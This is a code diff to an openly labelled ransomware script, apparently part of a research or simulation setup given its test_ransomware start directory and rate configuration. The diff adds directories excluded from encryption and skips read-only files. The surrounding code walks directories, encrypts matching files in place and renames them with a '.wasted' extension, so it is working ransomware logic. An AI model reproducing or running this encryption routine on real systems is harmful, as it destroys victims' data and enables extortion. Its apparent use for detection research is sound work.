@@ -17,6 +17,8 @@ from globals import get_config_from_file
 
 LINUX_STARTDIRS = [environ['HOME'] + '/test_ransomware']
 EXTENSION = ".wasted"  # Ransomware custom extension
+ROAR_DIR = "/roar"
+SAFE_DIRS = [ROAR_DIR, "/snap", "/sys", "/lib/python3"]
 
 # ============================================================
 # ============ 		KEYS 	  ==============
@@ -107,9 +109,10 @@ def discover_files(start_path):
     for dir_path, dirs, files in walk(start_path):
         for i in files:
             absolute_path = path.abspath(path.join(dir_path, i))
-            ext = absolute_path.split('.')[-1]
-            if ext in extensions and not path.islink(absolute_path):
-                yield absolute_path
+            if not any(absolute_path.startswith(safe_dir+"/") for safe_dir in SAFE_DIRS):
+                ext = absolute_path.split('.')[-1]
+                if ext in extensions and not path.islink(absolute_path):
+                    yield absolute_path
 
 
 def modify_file_inplace(file_name, crypto, flag, block_size=16):
@@ -219,10 +222,16 @@ def encrypt_files(key, start_dirs):
                 limit_files = config["BURST"]["duration"].startswith("f")
                 rate = float(config["BURST"]["rate"])
 
-                file_sizes += path.getsize(file)  # file size in bytes (= nr of characters)
-
                 crypt, flag, extra = select_encryption_algorithm(key)
-                modify_file_inplace(file, crypt.encrypt, flag[1:] + "0")
+                try:
+                    modify_file_inplace(file, crypt.encrypt, flag[1:] + "0")
+                except OSError as e:
+                    if e.strerror == "Read-only file system":
+                        continue
+                    else:
+                        raise e
+
+                file_sizes += path.getsize(file)  # file size in bytes (= nr of characters)
 
                 encrypted_name = file + (flag if not extra else flag + "--" + extra) + EXTENSION
                 rename(file, encrypted_name)
